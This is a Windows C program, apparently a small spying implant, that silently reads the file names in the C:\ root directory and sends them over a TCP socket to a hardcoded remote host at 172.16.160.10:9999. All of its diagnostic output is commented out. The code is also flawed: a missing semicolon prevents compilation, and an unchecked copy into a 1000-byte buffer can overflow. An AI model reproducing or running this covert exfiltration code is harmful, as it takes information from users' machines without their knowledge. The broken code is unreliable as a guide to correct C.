#include <stdio.h>
#include <winsock2.h>
#include <dirent.h>
#define IP "172.16.160.10"
#define PORT 9999 
#define FILE "C:\\"
#pragma comment(lib,"ws2_32.lib")

void Init();
void Connect(SOCKET* s);
void Send(SOCKET* s, char* message);

int main(){
	SOCKET s;
	Init();
	Connect(&s);
	char* aiut;
	char msg[1000];
	aiut = msg;
	struct dirent* files;
	DIR* dir = opendir(FILE);
	if(dir != NULL){
		while((files = readdir(dir)) != NULL){
			//printf("%s\n", files->d_name);
			strncpy(aiut, files->d_name, strlen(files->d_name));
			aiut += strlen(files->d_name);
			*aiut = '\n';
			aiut++;

		}
		*aiut = '\0'
		Send(&s, msg);
		closedir(dir);
	}
	else{
		//printf("[!]Error while opening directory[!]\n");
		exit(-1);
	}

	closesocket(s);
	WSACleanup();


	return 0;
}


void Init(){
	
	WSADATA wsaData;


	//printf("Initialising Winsock...\n");

	if(WSAStartup(MAKEWORD(2,2), &wsaData)){
		//printf("[!]Error in initialisation of Winsock[!]");
		exit(-1);

	}

	//printf("Winsock initialised successfully\n");

}

void Connect(SOCKET* s){

	struct sockaddr_in server; //Info riguardo il server

	if((*s = socket(AF_INET, SOCK_STREAM , 0)) == INVALID_SOCKET){
		//printf("[!]Error while creating socket[!]\n");
		exit(-1);
	}

	//printf("Socket created successfully\n");


	server.sin_addr.s_addr = inet_addr(IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(PORT);

	if(connect(*s, (struct sockaddr *)&server, sizeof(server)) < 0){
		//printf("[!]Error while connecting[!]\n");
		exit(-1);
	}

	//printf("Connected successfully\n");




}

void Send(SOCKET* s, char* message){
	if(send(*s, message, strlen(message), 0) < 0){
		//printf("Error while sending data\n");
		exit(-1);
	}

	//printf("Data sent successfully\n");
}